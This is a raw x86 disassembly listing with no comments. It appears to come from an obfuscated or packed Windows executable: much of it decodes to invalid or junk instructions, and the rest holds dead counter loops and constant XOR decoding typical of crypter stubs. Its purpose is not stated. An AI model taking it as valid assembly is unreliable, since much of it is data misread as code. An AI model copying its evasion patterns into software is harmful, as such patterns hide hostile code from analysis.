  40899e:	or     DWORD PTR ds:0x75aa01ea,eax
  4089a4:	cmp    cl,BYTE PTR [eax+eax*8+0x7347feb7]
  4089ab:	inc    edx
  4089ac:	out    0xda,al
  4089ae:	dec    edx
  4089af:	cli    
  4089b0:	rol    DWORD PTR [ebp+0x25],0xba
  4089b4:	lods   al,BYTE PTR ds:[esi]
  4089b5:	mov    cl,0x3e
  4089b7:	cmp    eax,esp
  4089b9:	fwait
  4089ba:	inc    eax
  4089bb:	inc    eax
  4089bc:	ss mov edi,0x4614b598
  4089c2:	popa   
  4089c3:	sub    ah,ah
  4089c5:	jmp    0x4758:0x16fd230d
  4089cc:	lods   al,BYTE PTR ds:[esi]
  4089cd:	test   al,0x62
  4089cf:	into   
  4089d0:	cld    
  4089d1:	mov    cl,0x54
  4089d3:	or     al,0x2a
  4089d5:	shl    DWORD PTR ds:[ecx-0x61],cl
  4089d9:	inc    esp
  4089da:	inc    esi
  4089db:	clc    
  4089dc:	mov    bh,0x27
  4089de:	ret    0x74d9
  4089e1:	clc    
  4089e2:	dec    edx
  4089e3:	mov    edx,0xe1e6db0a
  4089e8:	cmp    edx,esi
  4089ea:	lea    eax,[ebp+0x46]
  4089ed:	pop    esi
  4089ef:	(bad)  
  4089f1:	mov    ah,BYTE PTR [ecx+0x46]
  4089f4:	mov    ch,0xaa
  4089f6:	mov    ds:0xbe044081,al
  4089fb:	jl     0x4089d4
  4089fd:	jo     0x4089c1
  4089ff:	pop    edx
  408a00:	rcl    DWORD PTR cs:[edi+0x7ef3ad4a],0x82
  408a08:	je     0x408a3b
  408a0a:	lods   al,BYTE PTR ds:[esi]
  408a0b:	cld    
  408a0c:	sbb    eax,0x47489517
  408a11:	aad    0xf9
  408a13:	dec    edx
  408a14:	fdivr  QWORD PTR [esi-0x21]
  408a17:	pusha  
  408a18:	push   edx
  408a1a:	test   eax,0xe59c4b13
  408a1f:	push   ss
  408a20:	sbb    eax,0xe992b604
  408a25:	xchg   BYTE PTR [edx+0x2f1d842a],bh
  408a2b:	(bad)  
  408a2c:	scas   eax,DWORD PTR es:[edi]
  408a2d:	mov    eax,0x3292554f
  408a32:	nop
  408a33:	push   ss
  408a34:	mov    ch,0x4a
  408a36:	inc    edx
  408a37:	scas   al,BYTE PTR es:[edi]
  408a38:	add    dl,dl
  408a3a:	and    esp,ecx
  408a3c:	int    0x46
  408a3e:	popf   
  408a3f:	aaa    
  408a40:	out    dx,al
  408a41:	xchg   ebx,eax
  408a42:	loope  0x408a03
  408a44:	shr    bh,cl
  408a46:	bound  edi,QWORD PTR ds:0xc6bf5170
  408a4c:	aam    0x29
  408a4e:	jmp    0xf8d4:0xdb1eb2a4
  408a55:	int3   
  408a56:	push   es
  408a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a58:	xor    edi,DWORD PTR [ebp+0x7572e948]
  408a5e:	fild   DWORD PTR [ebx+0x6f23069f]
  408a64:	imul   esi,ecx,0xfb3bea61
  408a6a:	xlat   BYTE PTR ds:[ebx]
  408a6b:	outs   dx,DWORD PTR ds:[esi]
  408a6c:	gs fcmove st,st(7)
  408a6f:	pop    edi
  408a70:	xchg   BYTE PTR [esi+0x34],bh
  408a73:	dec    ecx
  408a74:	fcomip st,st(3)
  408a76:	pusha  
  408a77:	je     0x4089fa
  408a79:	leave  
  408a7a:	(bad)  
  408a7b:	sbb    eax,0xc18b8116
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e86a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e86a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e86a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430596
  408ab1:	push   0x42ef30
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42ebac
  408ac1:	mov    ecx,DWORD PTR ds:0x42e86a
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e86a,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e866,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x4305c2,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	popa   
  408b13:	add    esp,DWORD PTR [eax+ebp*4]
  408b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b8f
  408b1f:	sbb    BYTE PTR [esi-0x3a7179c],0xc5
  408b26:	jl     0x408b1c
  408b28:	cs das 
  408b2a:	xor    eax,0xfeb48f13
  408b2f:	ss sbb BYTE PTR ss:[edi],bh
  408b33:	and    DWORD PTR [eax],esi
  408b35:	mov    ch,0x2d
  408b37:	inc    ebx
  408b38:	push   eax
  408b39:	and    BYTE PTR [edi-0x7d97c2f7],bl
  408b3f:	imul   BYTE PTR [edx-0xf2fed8f]
  408b45:	shr    BYTE PTR [esi],1
  408b47:	sar    ch,cl
  408b49:	inc    edi
  408b4a:	(bad)  
  408b4b:	popa   
  408b4c:	inc    eax
  408b4d:	(bad)  
  408b4e:	sbb    BYTE PTR [esi],ah
  408b50:	(bad)
  408b55:	outs   dx,BYTE PTR ds:[esi]
  408b56:	sbb    ecx,esp
  408b58:	imul   ebx,ecx,0x44edcc63
  408b5e:	pop    eax
  408b5f:	shr    BYTE PTR [esi+0x74],cl
  408b62:	xchg   ecx,eax
  408b63:	pop    eax
  408b64:	xor    ch,BYTE PTR [ecx+0x18]
  408b67:	inc    eax
  408b68:	cmp    eax,0x9d5a892
  408b6d:	ds repz int 0x39
  408b71:	sub    DWORD PTR [eax+0x1e],ebx
  408b74:	mov    ah,0x3b
  408b76:	enter  0xa3da,0x18
  408b7a:	dec    esp
  408b7b:	fcomip st,st(6)
  408b7d:	mov    bh,BYTE PTR [edx+eiz*1-0x2f]
  408b81:	jmp    0x408b1a
  408b83:	jmp    0x2ca0:0xae343201
  408b8a:	bnd jno 0x408baf
  408b8d:	or     esi,eax
  408b8f:	stos   BYTE PTR es:[edi],al
  408b90:	cs push ecx
  408b92:	ds push 0x9f46cb59
  408b98:	inc    esi
  408b99:	lea    ebp,[ecx]
  408b9b:	jmp    0x408baf
  408b9d:	and    ah,BYTE PTR [ebp+esi*8-0x1]
  408ba1:	(bad)  
  408ba2:	data16 sbb dh,BYTE PTR [ebp+0x585d099b]
  408ba9:	pop    eax
  408baa:	pop    ebx
  408bab:	and    cl,BYTE PTR [edi-0x2be675e0]
  408bb1:	inc    BYTE PTR [ecx+0xb03c271]
  408bb7:	mov    esi,0xa1eb3229
  408bbc:	jmp    0x162cf535
  408bc1:	add    BYTE PTR [ebp-0x72],ch
  408bc4:	and    dl,ah
  408bc6:	retf   
  408bc7:	mov    BYTE PTR [ecx+edx*4-0x3746bec8],bl
  408bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bcf:	shr    DWORD PTR [ebp-0x37],0x1d
  408bd3:	movntps XMMWORD PTR [edi],xmm3
  408bd6:	xor    al,0x26
  408bd8:	fwait
  408bd9:	xchg   edx,eax
  408bda:	sbb    eax,0x7539dda7
  408bdf:	or     eax,ecx
  408be1:	and    eax,0xb3409d14
  408be6:	in     eax,dx
  408be7:	ins    DWORD PTR es:[edi],dx
  408be8:	(bad)  
  408be9:	fild   WORD PTR [esi-0x4]
  408bec:	ficom  DWORD PTR [ecx+0x72522321]
  408bf2:	cmp    DWORD PTR cs:[edi+edi*8],ebp
  408bf6:	lods   eax,DWORD PTR ds:[esi]
  408bf7:	dec    edx
  408bf8:	mov    ebp,0x2de9b350
  408bfd:	sub    dl,BYTE PTR ss:[ebx-0x70a7869c]
  408c04:	inc    esi
  408c05:	in     al,0xf9
  408c07:	push   ds
  408c08:	mov    DWORD PTR [ecx-0x17cc770d],esi
  408c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c0f:	mov    DWORD PTR [ebx],ecx
  408c11:	dec    ecx
  408c12:	jp     0x408bcf
  408c14:	fincstp 
  408c16:	sbb    BYTE PTR [esi-0x26],0x79
  408c1a:	rol    DWORD PTR ds:0x58de14a6,1
  408c20:	push   0xfdf368dd
  408c25:	mov    edi,DWORD PTR [edi+0xb]
  408c28:	shl    DWORD PTR [ebx+0x39],cl
  408c2b:	aaa    
  408c2c:	jnp    0x408c2b
  408c2e:	cmc    
  408c2f:	sahf   
  408c30:	pop    es
  408c31:	inc    ebx
  408c32:	or     BYTE PTR [ebx+0x43],0xf9
  408c36:	sbb    esp,DWORD PTR [ebp+0x29]
  408c39:	popf   
  408c3a:	push   ds
  408c3b:	es ja  0x408c80
  408c3e:	jg     0x408cbd
  408c40:	push   esp
  408c41:	pop    esi
  408c42:	xor    DWORD PTR [ebp+0x2fe5f40b],ebp
  408c48:	data16 jno 0x408bcc
  408c4b:	jle    0x408bd4
  408c4d:	jae    0x408c92
  408c4f:	fadd   QWORD PTR [esi]
  408c51:	dec    esp
  408c52:	inc    eax
  408c53:	fnstenv [ebx+0x2e7cf7cf]
  408c59:	lods   eax,DWORD PTR ds:[esi]
  408c5a:	mov    WORD PTR [esi-0x465c4b70],es
  408c60:	jno    0x408c7e
  408c62:	xchg   ch,cl
  408c64:	and    eax,0xb7f18c1b
  408c69:	add    eax,0x2bbe83c1
  408c6e:	sti    
  408c6f:	jno    0x408cb5
  408c71:	xchg   esp,eax
  408c72:	dec    ebp
  408c73:	loop   0x408c3d
  408c75:	mov    edi,0xcf9ad1bb
  408c7a:	dec    ebx
  408c7b:	rol    BYTE PTR [ecx+0xa2b945a],0x1e
  408c82:	cwde   
  408c83:	jae    0x408c23
  408c85:	das    
  408c86:	xlat   BYTE PTR ds:[ebx]
  408c87:	sub    eax,0x1c587b5e
  408c8c:	imul   esp,DWORD PTR [edx],0x7193ebb1
  408c92:	popf   
  408c93:	lock test DWORD PTR ds:0x9d442c45,esp
  408c9a:	inc    ecx
  408c9b:	je     0x408c3e
  408c9d:	stos   BYTE PTR es:[edi],al
  408c9e:	lods   eax,DWORD PTR ds:[esi]
  408c9f:	and    BYTE PTR [eax-0x27],dh
  408ca2:	je     0x408cf7
  408ca4:	push   eax
  408ca5:	aad    0x59
  408ca7:	adc    al,0x62
  408ca9:	adc    cl,bl
  408cab:	or     BYTE PTR [ebp+0x1],dl
  408cae:	lea    esp,[eax+0xfc6ddc5]
  408cb4:	(bad)  
  408cb5:	in     eax,0xc0
  408cb7:	push   edx
  408cb8:	jns    0x408c62
  408cba:	pusha  
  408cbb:	fimul  WORD PTR [ebx+0x37]
  408cbe:	xchg   esp,eax
  408cbf:	push   cs
  408cc0:	mov    dh,0xfa
  408cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc3:	outs   dx,BYTE PTR ds:[esi]
  408cc4:	add    DWORD PTR [eax+0x4],0x1e2d4310
  408ccb:	or     DWORD PTR [ecx-0x4c37db42],0x45
  408cd2:	out    dx,al
  408cd3:	or     al,0x5c
  408cd5:	sbb    BYTE PTR [edi-0x63],dh
  408cd8:	and    eax,0x8c73757d
  408cdd:	mov    ch,0x65
  408cdf:	sbb    eax,DWORD PTR [ecx-0x7d8618c8]
  408ce5:	dec    ecx
  408ce6:	inc    edi
  408ce7:	mov    esp,?
  408ce9:	push   esi
  408cea:	into   
  408ceb:	stos   BYTE PTR es:[edi],al
  408cec:	leave  
  408ced:	mov    edx,edx
  408cef:	xchg   BYTE PTR [ebx+0x2c29d4c2],ah
  408cf5:	add    eax,0x32729d
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x430676
  408d02:	mov    eax,ds:0x430692
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	test   DWORD PTR [ebx+0x59],0x7ed48cb7
  408d5b:	jle    0x408da2
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408d6d
  408d61:	cs jle 0x408dac
  408d64:	inc    esp
  408d65:	sbb    eax,edi
  408d67:	js     0x408d19
  408d69:	jle    0x408d0f
  408d6b:	std    
  408d6c:	push   0xafb8b309
  408d71:	and    DWORD PTR [esi],ecx
  408d73:	push   ss
  408d74:	jo     0x408dd0
  408d76:	pop    ebx
  408d77:	test   al,0x47
  408d79:	dec    eax
  408d7a:	adc    esp,DWORD PTR [edi+0xf8da28e]
  408d80:	xchg   edx,eax
  408d81:	lods   eax,DWORD PTR ds:[esi]
  408d82:	adc    DWORD PTR [esi+esi*4+0x52],edi
  408d86:	lea    edx,[esp+eiz*2-0x64]
  408d8a:	int3   
  408d8b:	mov    eax,0x9f858fbd
  408d90:	test   DWORD PTR [edx],ebp
  408d92:	rol    BYTE PTR [ecx],0xe0
  408d95:	mov    WORD PTR [edi-0x2be5cdcd],cs
  408d9b:	and    DWORD PTR [eax-0x7d0d49e8],edx
  408da1:	loop   0x408dee
  408da3:	lahf   
  408da4:	iret   
  408da5:	test   BYTE PTR [edi+0x3b93324c],0x4c
  408dac:	mov    WORD PTR [ebx],ds
  408dae:	pop    eax
  408daf:	call   DWORD PTR [ebp+0x33255a24]
  408db5:	or     DWORD PTR [eax],0x17
  408db8:	add    BYTE PTR ds:0xab28324b,al
  408dbe:	sbb    edx,edi
  408dc0:	jg     0x408e16
  408dc2:	push   es
  408dc3:	fs clc 
  408dc5:	dec    edx
  408dc6:	sbb    DWORD PTR [edx+0xd53ca3b],ebx
  408dcc:	push   ecx
  408dcd:	xor    bl,BYTE PTR [esi-0x6edd27d0]
  408dd3:	or     BYTE PTR [eax+0x4b67e191],bl
  408dd9:	rol    DWORD PTR [edx-0x6f],0x43
  408ddd:	popf   
  408dde:	sti    
  408ddf:	adc    bh,BYTE PTR [ebp-0x50]
  408de2:	rcl    DWORD PTR [eax+0x4c],0x15
  408de6:	call   0x1e6c9789
  408deb:	mov    ebx,DWORD PTR [ecx+ebx*2-0x43]
  408def:	jnp    0x408ddd
  408df1:	imul   ebx,DWORD PTR [edi+ebp*2-0x6b2f6cd4],0xe56a6bf3
  408dfc:	add    BYTE PTR [esi-0x7b3a41e6],ah
  408e02:	jmp    0x408de9
  408e04:	or     dh,BYTE PTR [ebx-0x545048ca]
  408e0a:	jg     0x408db0
  408e0c:	lods   al,BYTE PTR ds:[esi]
  408e0d:	pop    ds
  408e0e:	dec    eax
  408e0f:	mov    ds:0x570c3d34,eax
  408e14:	enter  0x8bf9,0xe3
  408e18:	xor    eax,0x5a30e795
  408e1d:	xchg   edi,eax
  408e1e:	inc    ebp
  408e1f:	cmp    DWORD PTR [eax+esi*2+0x78],ecx
  408e23:	xor    cl,BYTE PTR [edx]
  408e25:	jmp    DWORD PTR [eax]
  408e27:	mov    ebx,edx
  408e29:	cld    
  408e2a:	add    al,0x91
  408e2c:	loop   0x408e75
  408e2e:	aas    
  408e2f:	add    BYTE PTR [eax],dl
  408e31:	repz fisubr DWORD PTR [edx+eiz*2-0x47660f0]
  408e39:	mov    eax,0xc42f95b1
  408e3e:	xchg   ebp,eax
  408e3f:	sub    BYTE PTR [eax+0x6f],ch
  408e42:	in     eax,dx
  408e43:	and    eax,0x35459931
  408e48:	cmp    al,0xb3
  408e4a:	or     dh,BYTE PTR [edx-0x4995eac9]
  408e50:	lahf   
  408e51:	mov    ecx,0x3da1ef50
  408e56:	push   0xffffff96
  408e58:	jp     0x408e37
  408e5a:	mov    ebp,0x94d69a03
  408e5f:	daa    
  408e60:	repnz pusha 
  408e62:	repnz pushf 
  408e64:	jl     0x408e35
  408e66:	add    DWORD PTR [edx],esi
  408e68:	pop    esi
  408e69:	push   0x56
  408e6b:	dec    esp
  408e6c:	push   edi
  408e6d:	or     al,0x50
  408e6f:	fmul   QWORD PTR [esi-0x2d47d1e0]
  408e75:	dec    ebp
  408e76:	(bad)  
  408e77:	ja     0x408ebb
  408e79:	add    DWORD PTR [ebx-0x63],edi
  408e7c:	jge    0x408e3c
  408e7e:	and    DWORD PTR [ebp-0x7],esi
  408e81:	cmp    BYTE PTR [ebx-0x1d],dl
  408e84:	xchg   ebp,eax
  408e85:	push   ss
  408e86:	repz push ecx
  408e88:	les    eax,FWORD PTR [edx]
  408e8a:	imul   ecx,eax,0xb1e40b7a
  408e90:	mov    cl,0x3f
  408e92:	rcr    BYTE PTR [esi+0xe],cl
  408e95:	cs inc edi
  408e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e98:	mov    WORD PTR [ebx-0x4f],es
  408e9b:	or     DWORD PTR ds:0x8f650fdb,esi
  408ea1:	rcr    BYTE PTR [ecx],1
  408ea3:	jnp    0x408ec2
  408ea5:	dec    esi
  408ea6:	mov    BYTE PTR [ecx],al
  408ea8:	outs   dx,DWORD PTR ds:[esi]
  408ea9:	cdq    
  408eaa:	out    0x87,al
  408eac:	bound  esi,QWORD PTR [esi]
  408eae:	fimul  WORD PTR [edx+esi*4-0x23]
  408eb2:	out    0x53,eax
  408eb4:	xor    ah,al
  408eb6:	inc    edi
  408eb7:	jg     0x408e5f
  408eb9:	int    0x68
  408ebb:	and    eax,0x6f2bde42
  408ec0:	or     DWORD PTR [eax],esi
  408ec2:	add    al,0xf
  408ec4:	mov    ecx,0x9d593929
  408eca:	xchg   DWORD PTR [edi-0x2],edx
  408ecd:	cld    
  408ece:	sar    DWORD PTR [ebx+eiz*1],1
  408ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed2:	out    dx,al
  408ed3:	cmc    
  408ed4:	pop    eax
  408ed5:	xchg   edi,eax
  408ed6:	shr    dh,cl
  408ed8:	mov    DWORD PTR [esi-0x60eba8dc],eax
  408ede:	popf   
  408edf:	jp     0x408e76
  408ee1:	sar    BYTE PTR [ebp-0x2b],1
  408ee4:	push   edi
  408ee5:	xchg   ebx,eax
  408ee6:	call   0xb1dd:0x24cd0958
  408eed:	cmp    DWORD PTR [ebp+0x445fe273],esi
  408ef3:	sub    al,0x81
  408ef5:	fdivr  QWORD PTR [eax]
  408ef7:	sar    BYTE PTR [ecx+0x2c],cl
  408efa:	cmp    BYTE PTR [edx-0x5f],dh
  408efd:	stos   BYTE PTR es:[edi],al
  408efe:	aaa    
  408eff:	mov    edx,0xe810efa4
  408f04:	mov    esi,ebp
  408f06:	mov    esi,0x360fc11b
  408f0b:	icebp  
  408f0c:	pop    edi
  408f0d:	outs   dx,BYTE PTR ds:[esi]
  408f0e:	dec    esp
  408f0f:	jns    0x408eb9
  408f11:	or     al,BYTE PTR [esi]
  408f13:	sbb    DWORD PTR [edx+0x547e7379],ebp
  408f19:	jb     0x408ede
  408f1b:	cmc    
  408f1c:	xchg   esi,eax
  408f1d:	iret   
  408f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f1f:	inc    ecx
  408f20:	xchg   esi,eax
  408f21:	rep outs dx,DWORD PTR ds:[esi]
  408f23:	jp     0x408f28
  408f25:	addr16 jmp 0x408f59
  408f28:	adc    BYTE PTR [ebx],0x48
  408f2b:	push   0x19
  408f2d:	in     al,dx
  408f2e:	xchg   bl,dl
  408f30:	aaa    
  408f31:	stc    
  408f32:	sub    edx,edi
  408f34:	add    edx,0x5c1337a
  408f3a:	popf   
  408f3b:	jb     0x408f6f
  408f3d:	add    cl,cl
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ef08,0x42e86a
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x430646,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42ef28,0x42e866
  408f71:	call   DWORD PTR ds:0x42eb4c
  408f77:	sbb    DWORD PTR ds:0x42e862,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x4305ae,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x4305b2,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42ec04
  408faf:	sbb    DWORD PTR ds:0x430652,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e85a,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x4305c2,0x42ef08
  408fe0:	call   DWORD PTR ds:0x42ec80
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42ef24,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ec44
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x43065a,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ef14,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e862,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42eb3c
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x4305aa
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42ef24,0x43059a
  409056:	call   DWORD PTR ds:0x42ebdc
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e862,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e862
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e862,ebx
  40907e:	cmp    DWORD PTR ds:0x42e862,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ecac
  409097:	cmp    DWORD PTR ds:0x42e862,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ef14
  4090aa:	and    DWORD PTR ds:0x42ef20,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43058e
  4090bc:	sbb    edx,DWORD PTR ds:0x43064e
  4090c2:	mov    DWORD PTR ds:0x43058e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43059e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43059e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43059e,edx
  4090e2:	cmp    DWORD PTR ds:0x43059e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e87a
  4090f9:	push   0x42e9ad
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ecb0
  409109:	cmp    DWORD PTR ds:0x43059e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e866,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e866
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e866,edx
  40912d:	cmp    DWORD PTR ds:0x42e866,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42ebb0
  40914a:	cmp    DWORD PTR ds:0x42e866,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43059a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43058a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43058a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43058a,esi
  40917b:	cmp    DWORD PTR ds:0x43058a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e97b
  40918d:	push   0x42e87a
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42ebc8
  40919d:	cmp    DWORD PTR ds:0x43058a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43058a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43058a,esi
  4091b7:	cmp    DWORD PTR ds:0x43058a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ef1c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x43064e,0x4305a2
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x43064e
  4091fe:	adc    DWORD PTR ds:0x42ef18,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43058e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43058e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43058e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43059e,0x4305ba
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x4305ae,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x4305e2
  409277:	mov    eax,ds:0x42ea9c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e86e,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x4305aa
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x4305ba
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x4305b2
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x430656,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42ef20,0x10
  4092e1:	cmp    DWORD PTR ds:0x42ef20,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42ef20,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42ebcc
  409310:	mov    edi,DWORD PTR ds:0x42ef20
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42ef20,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ef14,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e876,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
